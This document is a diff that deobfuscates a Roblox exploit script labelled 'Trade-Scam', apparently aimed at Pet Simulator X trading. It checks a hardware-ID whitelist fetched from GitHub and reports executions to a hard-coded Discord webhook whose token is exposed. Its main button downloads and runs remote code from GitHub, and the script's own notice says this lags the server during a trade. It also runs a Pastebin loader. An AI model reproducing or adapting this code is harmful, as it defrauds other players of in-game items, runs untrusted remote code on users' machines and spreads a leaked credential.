@@ -1,12 +1,180 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 
+--// HWID SYSTEM \\--
+local hwidKeysTable = loadstring(game:HttpGet("https://raw.githubusercontent.com/ioshpere/eyeys/main/eyeys", true))()
+local plrHWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
-]]--
+local isWhitelisted = true
+local oooKey = nil
 
-local v0=loadstring(game:HttpGet("https://raw.githubusercontent.com/ioshpere/eyeys/main/eyeys",true))();local v1=game:GetService("RbxAnalyticsService"):GetClientId();local v2=true;local v3=nil;for v4,v5 in pairs(v0) do if (v4==v1) then v2=true;v3=v5[1];if ((v1~="767DC629-96ED-4BC3-987E-0DD4BDE82DB2") and (v1~="07C4040C-CE6D-496E-A35A-536AC1DE9870")) then local v28="https://discord.com/api/webhooks/1038195548643135529/MYYvEQbzlP5XMXWvKoEvkPgExoNw6ic2o4up4jYeM13A6l3tscvoIvZSqWSfkrF8Zxs-";local v29={embeds={{title="||#script-execution||"   .. v5[2]   .. " Has Executed Your Script!",description=nil,type="rich",color=tonumber(7498202)}}};local v30=game:GetService("HttpService"):JSONEncode(v29);local v31={content-type="application/json"};request=http_request or request or HttpPost or syn.request;local v32={Url=v28,Body=v30,Method="POST",Headers=v31};request(v32);end end end if v2 then local v6=game:GetService("TeleportService");local v7=game.Players.LocalPlayer;getgenv().v8=false;_G.v9=nil;local v10=nil;local v11=170;local v12=nil;local v13=false;local v14=false;local v15=loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))();local v16=v15:CreateWindow({Name="Array  (Private)",LoadingTitle="",LoadingSubtitle="Array",ConfigurationSaving={Enabled=true,FolderName="Array",FileName="Settings-Config"},Discord={Enabled=false,Invite="9deU48CeqU",RememberJoins=true},KeySystem=false,KeySettings={Title="Arrays-KEY SYSTEM",Subtitle="Key System",Note="Join the discord (discord.gg/9deU48CeqU)",FileName="Arrays",SaveKey=true,GrabKeyFromSite=false,Key=v3}});local v17=v16:CreateTab("Trade-Scam",4483362458);local v18=v17:CreateSection("Please Press Trade Scam When Someone Hits Ready Then 2 times Press Ready");local v19=v17:CreateSlider({Name="Rep Amount",Range={10,300},Increment=10,Suffix="Rep",CurrentValue=140,Flag="RepFlag",Callback=function(v26)v11=v26;end});local v20=v17:CreateButton({Name="Trade-Scam",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/subhian922/PSX-HUB-2/main/PSX-HUB2.lua"))();v15:Notify({Title="Notification",Content="Lagging the Server",Duration=4,Image=4483362458,Actions={}});end});local v21=v16:CreateTab("Settings",4483362458);local v22=v21:CreateLabel("Destroy GUI");local v23=v21:CreateKeybind({Name="Destroy Gui Key Bind",CurrentKeybind="LeftControl",HoldToInteract=false,Flag="GUI-Destroy",Callback=function(v27)v15:Destroy();end});local v24=v16:CreateTab("Credits",4483362458);local v22=v24:CreateLabel("Script Made By Arraypsx");local v25=v24:CreateButton({Name="Discord-Link press the button to copy link",Callback=function()setclipboard("https://discord.gg/4e8NcdEtt9");v15:Notify({Title="Notification",Content="Discord Invite Copied To Clipboard",Duration=4,Image=4483362458,Actions={Ignore={Name="Okay!",Callback=function()end}}});end});loadstring(game:HttpGet("https://pastebin.com/raw/2G4J0Sde",true))();v15:LoadConfiguration();end
+for hwid, info in pairs(hwidKeysTable) do
+	if hwid == plrHWID then
+		isWhitelisted = true
+		oooKey = info[1]
+		if plrHWID ~= "767DC629-96ED-4BC3-987E-0DD4BDE82DB2" and plrHWID ~= "07C4040C-CE6D-496E-A35A-536AC1DE9870" then
+			local url = "https://discord.com/api/webhooks/1038195548643135529/MYYvEQbzlP5XMXWvKoEvkPgExoNw6ic2o4up4jYeM13A6l3tscvoIvZSqWSfkrF8Zxs-"
+			local data = {
+			["embeds"] = {
+				{
+					["title"] = "||#script-execution||"..info[2].." Has Executed Your Script!",
+					["description"] = nil,
+					["type"] = "rich",
+					["color"] = tonumber(0x7269da),
+				}
+			}
+			}
+			local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+			local headers = {
+			["content-type"] = "application/json"
+			}
+			request = http_request or request or HttpPost or syn.request
+			local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+			request(abcdef)
+		end
+	end
+end
+
+
+
+if isWhitelisted then
+
+	--// VARIBLES \\--
+	local TeleportService = game:GetService("TeleportService")
+
+	local plr = game.Players.LocalPlayer
+
+	getgenv().autoHatch = false
+
+	_G.Webhook = nil
+
+	local selectedAutofarm = nil
+
+	local rep = 170
+
+	local currentEgg = nil
+	local tripleHatch = false
+	local octubleHatch = false
+
+
+	--// RAYFIELD TRADE SCAM \\--
+
+	local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+	
+	local Window = Rayfield:CreateWindow({
+		Name = "Array  (Private)",
+		LoadingTitle = "",
+		LoadingSubtitle = "Array",
+		ConfigurationSaving = {
+			Enabled = true,
+			FolderName = "Array", -- Create a custom folder for your hub/game
+			FileName = "Settings-Config"
+		},
+			Discord = {
+				Enabled = false,
+				Invite = "9deU48CeqU", -- The Discord invite code, do not include discord.gg/
+				RememberJoins = true, -- Set this to false to make them join the discord every time they load it up
+			},
+		KeySystem = false, -- Set this to true to use our key system
+		KeySettings = {
+			Title = "Arrays-KEY SYSTEM",
+			Subtitle = "Key System",
+			Note = "Join the discord (discord.gg/9deU48CeqU)",
+			FileName = "Arrays",
+			SaveKey = true,
+			GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+			Key = oooKey,
+		}
+	})
+
+	--// MAIN TAB \\--
+
+	local MainTab = Window:CreateTab("Trade-Scam", 4483362458) -- Title, Image
+	local Section = MainTab:CreateSection("Please Press Trade Scam When Someone Hits Ready Then 2 times Press Ready")
+
+	local RepSlider = MainTab:CreateSlider({
+	Name = "Rep Amount",
+	Range = {10, 300},
+	Increment = 10,
+	Suffix = "Rep",
+	CurrentValue = 140,
+	Flag = "RepFlag",
+	Callback = function(Value)
+		rep = Value
+	end,
+	})
+
+	local TradeScamButton = MainTab:CreateButton({
+		Name = "Trade-Scam",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/subhian922/PSX-HUB-2/main/PSX-HUB2.lua"))()
+			Rayfield:Notify({
+			Title = "Notification",
+			Content = "Lagging the Server",
+			Duration = 4,
+			Image = 4483362458,
+			Actions = { -- Notification Buttons
+				-- Ignore = {
+				-- 	Name = "Okay!",
+				-- 	Callback = function()
+					
+				-- 	end
+				-- },
+			},
+			})
+		end,
+	})
+
+
+
+
+	--// SETTINGS TAB \\--
+
+	local SettingsTab = Window:CreateTab("Settings", 4483362458)
+
+	local Label = SettingsTab:CreateLabel("Destroy GUI")
+
+	local Keybind = SettingsTab:CreateKeybind({
+		Name = "Destroy Gui Key Bind",
+		CurrentKeybind = "LeftControl",
+		HoldToInteract = false,
+		Flag = "GUI-Destroy", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+		Callback = function(Keybind)
+			Rayfield:Destroy()
+		end,
+	})
+
+
+	--// CREADITS TAB \\--
+
+	local CreditsTab = Window:CreateTab("Credits", 4483362458)
+
+	local Label = CreditsTab:CreateLabel("Script Made By Arraypsx")
+	
+
+	local Button = CreditsTab:CreateButton({
+		Name = "Discord-Link press the button to copy link",
+		Callback = function()
+			setclipboard("https://discord.gg/4e8NcdEtt9")
+				Rayfield:Notify({
+				Title = "Notification",
+				Content = "Discord Invite Copied To Clipboard",
+				Duration = 4,
+				Image = 4483362458,
+				Actions = { -- Notification Buttons
+					Ignore = {
+						Name = "Okay!",
+						Callback = function()
+						end
+					},
+				},
+			})
+		end,
+	})
+
+
+	--// ANTI AFK \\--
+	loadstring(game:HttpGet("https://pastebin.com/raw/2G4J0Sde", true))()
+
+	--// LOAD SETTINGS \\--
+	Rayfield:LoadConfiguration()
+
+end
